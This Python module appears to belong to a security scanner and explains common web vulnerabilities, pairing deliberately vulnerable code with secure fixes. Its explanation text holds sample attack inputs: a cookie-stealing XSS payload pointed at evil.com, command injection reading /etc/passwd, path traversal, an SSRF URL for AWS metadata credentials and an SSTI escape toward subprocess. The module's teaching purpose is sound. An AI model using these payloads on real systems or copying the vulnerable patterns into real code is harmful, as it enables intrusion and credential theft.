"""
CyberSentry Explain + Fix Engine.
Translates technical findings into clear human explanations
and provides concrete, language-specific code fixes.
Phase 1: rule-based. Phase 2: LLM-enhanced contextual suggestions.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class Explanation:
    finding_type: str
    title: str
    what_happened: str          # Plain English: what the vulnerability is
    how_exploited: str          # How an attacker would exploit it
    business_impact: str        # What could go wrong
    owasp_link: str
    cwe_link: str | None
    fixes: list["CodeFix"]
    learning_resources: list[str]
    difficulty: str             # easy / medium / hard to exploit
    prevalence: str             # common / moderate / rare


@dataclass
class CodeFix:
    language: str
    title: str
    vulnerable_code: str        # The bad pattern
    fixed_code: str             # The correct replacement
    explanation: str


# ── Fix library ───────────────────────────────────────────────────────────────
_FIXES: dict[str, list[CodeFix]] = {

    "SQLI-001": [
        CodeFix(
            language="Python (SQLAlchemy)",
            title="Use parameterized queries",
            vulnerable_code="""# VULNERABLE — never do this
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)""",
            fixed_code="""# SECURE — use parameterized queries
username = request.form['username']
result = db.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username}
)""",
            explanation="Parameterized queries separate SQL code from data, making injection impossible.",
        ),
        CodeFix(
            language="Python (raw sqlite3)",
            title="Use ? placeholders",
            vulnerable_code="""# VULNERABLE
cursor.execute("SELECT * FROM users WHERE id = " + user_id)""",
            fixed_code="""# SECURE
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))""",
            explanation="The ? placeholder is bound by the database driver, never concatenated into SQL.",
        ),
    ],

    "XSS-001": [
        CodeFix(
            language="Python (Jinja2)",
            title="Use autoescaping",
            vulnerable_code="""# VULNERABLE — Markup() marks string as safe, bypasses escaping
from markupsafe import Markup
return render_template("page.html", name=Markup(user_input))""",
            fixed_code="""# SECURE — let Jinja2 autoescape (default in Flask)
return render_template("page.html", name=user_input)
# Jinja2 will escape <, >, &, ", ' automatically""",
            explanation="Jinja2 autoescaping is enabled by default in Flask. Never wrap user input in Markup().",
        ),
        CodeFix(
            language="Python (manual)",
            title="HTML-encode output",
            vulnerable_code="""# VULNERABLE
html = f"<p>Hello {username}</p>"
return HTMLResponse(html)""",
            fixed_code="""# SECURE
import html
safe_name = html.escape(username)
response_html = f"<p>Hello {safe_name}</p>"
return HTMLResponse(response_html)""",
            explanation="html.escape() converts <, >, &, \", ' to HTML entities, preventing script injection.",
        ),
        CodeFix(
            language="HTTP Headers",
            title="Set Content-Security-Policy",
            vulnerable_code="# No CSP header set",
            fixed_code="""# Add to your FastAPI app
from fastapi.middleware.trustedhost import TrustedHostMiddleware

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:;"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response""",
            explanation="CSP is a defence-in-depth layer that prevents execution of injected scripts even if XSS occurs.",
        ),
    ],

    "CMDI-001": [
        CodeFix(
            language="Python",
            title="Use subprocess with list args, no shell=True",
            vulnerable_code="""# VULNERABLE — shell=True with user input is RCE
import subprocess
filename = request.query_params.get("file")
result = subprocess.run(f"convert {filename} output.pdf", shell=True)""",
            fixed_code="""# SECURE — pass args as list, shell=False (default)
import subprocess
import shlex
filename = request.query_params.get("file", "")

# Validate against an allowlist first
ALLOWED_FILES = {"report.pdf", "invoice.pdf", "receipt.pdf"}
if filename not in ALLOWED_FILES:
    raise HTTPException(400, "Invalid file")

result = subprocess.run(
    ["convert", filename, "output.pdf"],
    capture_output=True,
    timeout=30,
    shell=False   # Never True with user input
)""",
            explanation="When args is a list, the OS executes the binary directly with no shell interpretation. Shell metacharacters (;, |, &) are treated as literal characters.",
        ),
    ],

    "PATH-001": [
        CodeFix(
            language="Python",
            title="Resolve and verify path stays within base directory",
            vulnerable_code="""# VULNERABLE — user can traverse with ../../
from pathlib import Path
filename = request.query_params.get("file")
content = Path(f"/app/uploads/{filename}").read_text()""",
            fixed_code="""# SECURE — jail to base directory
from pathlib import Path
from fastapi import HTTPException

BASE_DIR = Path("/app/uploads").resolve()

def safe_read(filename: str) -> str:
    # Resolve the full path (expands .., symlinks, etc.)
    target = (BASE_DIR / filename).resolve()

    # Verify it's still within BASE_DIR
    if not str(target).startswith(str(BASE_DIR)):
        raise HTTPException(400, "Invalid file path")

    # Verify it's a file (not a directory)
    if not target.is_file():
        raise HTTPException(404, "File not found")

    return target.read_text()""",
            explanation="Path.resolve() expands all .. sequences and symlinks. Checking the prefix guarantees the file is within the intended directory.",
        ),
    ],

    "SSRF-001": [
        CodeFix(
            language="Python",
            title="Validate URLs against allowlist + block private IPs",
            vulnerable_code="""# VULNERABLE — user controls the URL
import httpx
url = request.query_params.get("webhook_url")
response = await httpx.get(url)""",
            fixed_code="""# SECURE — validate URL before fetching
import ipaddress
import socket
from urllib.parse import urlparse
import httpx
from fastapi import HTTPException

ALLOWED_DOMAINS = {"api.stripe.com", "hooks.slack.com"}
PRIVATE_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # Link-local / metadata
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False

    # Domain allowlist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False

    # Resolve and check for private IPs (DNS rebinding prevention)
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        for private in PRIVATE_RANGES:
            if ip in private:
                return False
    except (socket.gaierror, ValueError):
        return False

    return True

url = request.query_params.get("webhook_url")
if not is_safe_url(url):
    raise HTTPException(400, "URL not allowed")

response = await httpx.get(url, follow_redirects=False)""",
            explanation="Always use an allowlist for external URLs. Resolve DNS and block RFC1918 + link-local ranges to prevent SSRF to cloud metadata or internal services.",
        ),
    ],

    "SSTI-001": [
        CodeFix(
            language="Python (Jinja2)",
            title="Pass user data as context, never as template string",
            vulnerable_code="""# VULNERABLE — user controls the template!
from jinja2 import Environment
env = Environment()
user_template = request.form.get("email_template")
template = env.from_string(user_template)   # RCE if user crafts template
result = template.render(name=user.name)""",
            fixed_code="""# SECURE — template is hardcoded, user data is context
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape())

# Template string is developer-controlled, not user-controlled
TEMPLATE = "Hello {{ name }}! Your order {{ order_id }} is confirmed."
template = env.from_string(TEMPLATE)

# User data goes in context variables, NOT in the template
result = template.render(
    name=user.name,           # Safely escaped by autoescape
    order_id=order.id,
)""",
            explanation="Template strings must always be developer-controlled. User data is passed as context variables, which are safely escaped by the template engine.",
        ),
    ],

    "SECRETS-001": [
        CodeFix(
            language="Python",
            title="Use environment variables for secrets",
            vulnerable_code="""# VULNERABLE — hardcoded secrets in source code
API_KEY = "sk-abc123xyzDEF456secret789"
DATABASE_URL = "postgresql://admin:P@ssw0rd@prod-db:5432/app"
SECRET_KEY = "my-super-secret-key-12345" """,
            fixed_code="""# SECURE — read from environment variables
import os
from dotenv import load_dotenv

load_dotenv()  # loads from .env file in development

API_KEY = os.environ["API_KEY"]         # Raises if not set — intentional
DATABASE_URL = os.environ["DATABASE_URL"]
SECRET_KEY = os.environ["SECRET_KEY"]

# Or with pydantic-settings (recommended):
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    api_key: str
    database_url: str
    secret_key: str

settings = Settings()  # Reads from env / .env automatically""",
            explanation="Secrets in source code end up in version control, logs, and error messages. Use environment variables, a secrets manager (AWS Secrets Manager, HashiCorp Vault), or at minimum a .env file that is gitignored.",
        ),
    ],

    "DEP-CVE": [
        CodeFix(
            language="Shell / pip",
            title="Update vulnerable dependency",
            vulnerable_code="# pip install requests==2.6.0   # CVE-2014-1829, CVE-2014-1830",
            fixed_code="""# Update to the patched version
pip install --upgrade requests

# Or pin to a known-safe version in requirements.txt
requests>=2.31.0,<3.0.0

# Audit regularly:
pip-audit
safety check""",
            explanation="Keep dependencies updated. Run pip-audit or safety check in CI/CD to catch CVEs automatically.",
        ),
    ],
}


# ── Explanation database ──────────────────────────────────────────────────────
_EXPLANATIONS: dict[str, dict[str, Any]] = {
    "SQLI": {
        "title": "SQL Injection",
        "what_happened": (
            "User-supplied input was embedded directly into a SQL query string. "
            "This allows an attacker to change the meaning of the query — logging in without "
            "a password, reading other users' data, or deleting tables entirely."
        ),
        "how_exploited": (
            "An attacker enters crafted input like `' OR '1'='1` in a login form. "
            "The server concatenates this into: WHERE username = '' OR '1'='1' — "
            "which is always true, granting access to every account."
        ),
        "business_impact": (
            "Full database compromise, mass data breach, loss of all user credentials, "
            "complete destruction of application data, regulatory fines (GDPR, HIPAA)."
        ),
        "owasp_link": "https://owasp.org/Top10/A03_2021-Injection/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/89.html",
        "difficulty": "easy",
        "prevalence": "common",
        "learning_resources": [
            "https://portswigger.net/web-security/sql-injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
    },
    "XSS": {
        "title": "Cross-Site Scripting (XSS)",
        "what_happened": (
            "User input is reflected in an HTML response without being encoded. "
            "This lets an attacker inject JavaScript that runs in another user's browser."
        ),
        "how_exploited": (
            "An attacker stores a payload like <script>document.location='https://evil.com/?c='+document.cookie</script>. "
            "When a victim views the page, their session cookie is silently sent to the attacker."
        ),
        "business_impact": (
            "Session hijacking, account takeover, credential phishing, defacement, "
            "malware distribution to your users."
        ),
        "owasp_link": "https://owasp.org/Top10/A03_2021-Injection/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/79.html",
        "difficulty": "easy",
        "prevalence": "common",
        "learning_resources": [
            "https://portswigger.net/web-security/cross-site-scripting",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
        ],
    },
    "CMDI": {
        "title": "Command Injection",
        "what_happened": (
            "User input was passed to a system shell command without sanitization. "
            "An attacker can chain additional commands using ;, |, &, or backticks."
        ),
        "how_exploited": (
            "If a search endpoint runs `grep -r {user_input} /logs`, an attacker sends "
            "`; cat /etc/passwd` — running two commands: grep (which fails) and cat (which succeeds)."
        ),
        "business_impact": (
            "Full server compromise, remote code execution, data exfiltration, "
            "lateral movement to internal systems, installation of backdoors/ransomware."
        ),
        "owasp_link": "https://owasp.org/Top10/A03_2021-Injection/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/78.html",
        "difficulty": "easy",
        "prevalence": "moderate",
        "learning_resources": [
            "https://portswigger.net/web-security/os-command-injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
        ],
    },
    "PATH": {
        "title": "Path Traversal",
        "what_happened": (
            "A user-controlled filename or path was used to access the filesystem "
            "without validating that the resolved path stays within the intended directory."
        ),
        "how_exploited": (
            "A file download endpoint at /files?name=report.pdf can be exploited "
            "with name=../../etc/passwd to read the system password file."
        ),
        "business_impact": (
            "Read arbitrary files (source code, .env secrets, /etc/shadow), "
            "potentially write files if the endpoint supports uploads."
        ),
        "owasp_link": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/22.html",
        "difficulty": "easy",
        "prevalence": "common",
        "learning_resources": [
            "https://portswigger.net/web-security/file-path-traversal",
        ],
    },
    "SSRF": {
        "title": "Server-Side Request Forgery (SSRF)",
        "what_happened": (
            "The server made an HTTP request to a URL controlled by the user. "
            "This lets attackers probe internal services and cloud metadata APIs."
        ),
        "how_exploited": (
            "A webhook or URL-fetch feature can be pointed at http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
            "to steal temporary AWS IAM credentials, giving an attacker full cloud access."
        ),
        "business_impact": (
            "Cloud credential theft, internal network scanning, access to internal APIs, "
            "data exfiltration from internal services."
        ),
        "owasp_link": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/918.html",
        "difficulty": "medium",
        "prevalence": "common",
        "learning_resources": [
            "https://portswigger.net/web-security/ssrf",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        ],
    },
    "SSTI": {
        "title": "Server-Side Template Injection (SSTI)",
        "what_happened": (
            "User input was rendered as part of a server-side template, "
            "allowing the attacker to execute template expressions and potentially arbitrary code."
        ),
        "how_exploited": (
            "Input {{7*7}} returns 49 in the response, confirming Jinja2 template evaluation. "
            "An attacker then uses {{''.__class__.__mro__[1].__subclasses__()}} to traverse "
            "Python's class hierarchy and find subprocess.Popen for RCE."
        ),
        "business_impact": "Remote code execution — full server compromise.",
        "owasp_link": "https://owasp.org/Top10/A03_2021-Injection/",
        "cwe_link": "https://cwe.mitre.org/data/definitions/1336.html",
        "difficulty": "medium",
        "prevalence": "moderate",
        "learning_resources": [
            "https://portswigger.net/web-security/server-side-template-injection",
        ],
    },
}


class ExplainEngine:
    """Provides human explanations and code fixes for security findings."""

    def explain(self, rule_id: str) -> Explanation | None:
        """Get explanation for a rule ID (e.g. 'SQLI-001', 'XSS-002')."""
        # Extract category prefix (SQLI, XSS, etc.)
        category = rule_id.split("-")[0] if "-" in rule_id else rule_id

        base = _EXPLANATIONS.get(category)
        if not base:
            return None

        fixes = self._get_fixes(rule_id, category)

        return Explanation(
            finding_type=rule_id,
            title=base["title"],
            what_happened=base["what_happened"],
            how_exploited=base["how_exploited"],
            business_impact=base["business_impact"],
            owasp_link=base["owasp_link"],
            cwe_link=base.get("cwe_link"),
            fixes=fixes,
            learning_resources=base.get("learning_resources", []),
            difficulty=base.get("difficulty", "medium"),
            prevalence=base.get("prevalence", "common"),
        )

    def _get_fixes(self, rule_id: str, category: str) -> list[CodeFix]:
        """Return fixes for a specific rule or its category."""
        # Try exact rule match first
        if rule_id in _FIXES:
            return _FIXES[rule_id]
        # Fall back to category prefix
        category_key = f"{category}-001"
        return _FIXES.get(category_key, [])

    def explain_secret(self) -> Explanation:
        """Explanation for hardcoded secret findings."""
        return Explanation(
            finding_type="SECRETS-001",
            title="Hardcoded Secret / Credential",
            what_happened=(
                "A secret value (API key, password, token) was found hardcoded in source code. "
                "Once committed to Git, secrets are permanent — they remain in history even after deletion."
            ),
            how_exploited=(
                "Attackers scan public GitHub repos for patterns like AWS keys, Stripe keys, and database URLs. "
                "Tools like TruffleHog and GitLeaks find these in seconds. Even private repos are at risk if "
                "the repo is ever made public or a developer's machine is compromised."
            ),
            business_impact=(
                "Unauthorized API usage charges, data breach via compromised database, "
                "cloud account takeover, financial fraud via payment API."
            ),
            owasp_link="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            cwe_link="https://cwe.mitre.org/data/definitions/798.html",
            fixes=_FIXES.get("SECRETS-001", []),
            learning_resources=[
                "https://docs.github.com/en/code-security/secret-scanning",
                "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html",
            ],
            difficulty="easy",
            prevalence="common",
        )

    def explain_cve(self, package: str, cve_id: str, description: str) -> Explanation:
        """Generate an explanation for a CVE finding."""
        return Explanation(
            finding_type="DEP-CVE",
            title=f"Vulnerable Dependency: {package} ({cve_id})",
            what_happened=(
                f"Package '{package}' has a known vulnerability ({cve_id}). {description}"
            ),
            how_exploited=(
                "Attackers scan for apps using vulnerable library versions (often via HTTP headers, "
                "error pages, or automated CVE scanners). Once identified, they apply known exploits."
            ),
            business_impact=(
                "Depends on the CVE — ranges from information disclosure to full remote code execution. "
                "Check the CVE score and description for specifics."
            ),
            owasp_link="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
            cwe_link=None,
            fixes=_FIXES.get("DEP-CVE", []),
            learning_resources=[
                f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                "https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html",
            ],
            difficulty="easy",
            prevalence="common",
        )
